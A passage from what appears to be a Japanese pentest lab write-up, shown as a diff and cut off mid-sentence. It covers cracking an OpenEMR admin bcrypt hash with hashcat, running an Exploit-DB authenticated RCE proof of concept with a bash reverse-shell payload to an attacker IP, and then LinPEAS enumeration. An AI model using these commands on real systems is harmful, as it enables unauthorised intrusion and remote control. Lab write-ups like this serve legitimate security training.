@@ -44,4 +44,19 @@ $ echo -n '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' > admin
 $ hashcat admin_hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt --force
 ```
 
-8. OpenEMR のログインフォームからログインし、バージョン情報を特定のうえ、Exploit-DB で RCE Authenticated の PoC ([45161 - Exploit-DB](https://www.exploit-db.com/exploits/45161)) を
+8. OpenEMR のログインフォームからログインし、バージョン情報を特定のうえ、Exploit-DB で RCE Authenticated の PoC ([45161 - Exploit-DB](https://www.exploit-db.com/exploits/45161)) を発見したので、リバースシェルペイロードを実行
+```sh
+python2 openemr_rce.py http://192.168.155.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.182/443 0>&1'
+```
+
+9. www-data としてシェルを獲得したので、 LinPEAS を実行し、特に興味深い情報がないことを確認
+
+---
+
+# 以下は怪しそうに見えたけど怪しくないものだった
+
+```sh
+root      1402  0.0  2.5 492324 26028 ?        Ss   00:04   0:00 /usr/sbin/apache2 -k start
+www-data  1418  0.0  3.2 500904 33036 ?        S    00:04   0:00  _ /usr/sbin/apache2 -k start
+```
+- LinPEAS の結果で、 PHP が allow_url_fo
